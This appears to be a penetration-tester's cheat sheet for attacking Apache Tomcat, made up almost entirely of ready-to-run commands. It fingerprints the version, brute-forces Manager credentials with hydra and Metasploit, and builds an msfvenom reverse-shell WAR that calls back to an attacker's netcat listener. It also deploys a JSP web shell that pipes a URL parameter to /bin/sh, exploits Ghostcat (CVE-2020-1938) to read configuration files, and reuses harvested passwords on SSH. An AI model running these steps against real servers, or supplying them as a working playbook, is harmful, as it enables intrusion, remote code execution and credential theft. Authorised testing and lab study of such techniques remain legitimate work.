# Tomcat

## Is it, and which version
curl -skI <Scheme>://<WebHost>/
curl -sk <Scheme>://<WebHost>/no-such-page | grep -io 'apache tomcat/[0-9.]*'
curl -sk -o /dev/null -w '%{http_code}\n' <Scheme>://<WebHost>/manager/html
curl -sk -o /dev/null -w '%{http_code}\n' <Scheme>://<WebHost>/host-manager/html
- [ ] 401 on /manager/html: the Manager is there, behind basic auth
- [ ] 403 on it: the Manager only answers localhost, which an SSRF or a tunnel can reach
- [ ] The version through searchsploit, and port 8009 open for Ghostcat

## Manager credentials
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt <Scheme>-get://<WebHost>/manager/html
msfconsole -q -x 'use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS <TargetIP>; set RPORT <Port>; run'
- [ ] By hand: tomcat:s3cret, admin:admin, tomcat:tomcat, admin:tomcat, both:tomcat
- [ ] Through an LFI: conf/tomcat-users.xml, under /opt/tomcat, /usr/share/tomcat9, /var/lib/tomcat9 or /etc/tomcat9

## A WAR that calls back
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o rev.war
rlwrap nc -lvnp <LPORT>
Through the text API, which needs the manager-script role:
curl -sk --upload-file rev.war -u '<Username>:<Password>' '<Scheme>://<WebHost>/manager/text/deploy?path=/rev'
curl -sk <Scheme>://<WebHost>/rev/
- [ ] OK - Deployed application at context path [/rev]
- [ ] Only manager-gui: log in at /manager/html and use WAR file to deploy
- [ ] The path is taken: a new one, or undeploy the old
curl -sk -u '<Username>:<Password>' '<Scheme>://<WebHost>/manager/text/undeploy?path=/rev'

## A command page instead
For a Linux Tomcat, a JSP that runs cmd through sh:
mkdir -p cmdwar
cat > cmdwar/index.jsp <<'EOF'
<%@ page import="java.io.*" %><% Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("cmd")}); BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null){out.println(l);} %>
EOF
cd cmdwar && zip ../cmd.war index.jsp && cd ..
curl -sk --upload-file cmd.war -u '<Username>:<Password>' '<Scheme>://<WebHost>/manager/text/deploy?path=/cmd'
curl -sk '<Scheme>://<WebHost>/cmd/?cmd=id'
- [ ] A Windows Tomcat: cmd.exe /c in place of /bin/sh -c, and it often runs as SYSTEM

## Ghostcat, AJP on 8009
- [ ] Tomcat before 9.0.31, 8.5.51 or 7.0.100, with 8009 reachable: CVE-2020-1938 reads files inside the web app
msfconsole -q -x 'use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS <TargetIP>; set FILENAME /WEB-INF/web.xml; run'
- [ ] web.xml read for credentials and the names of other files to read the same way

## After the shell
find / -name tomcat-users.xml 2>/dev/null
- [ ] Every user and password in it tried on SSH and the other services
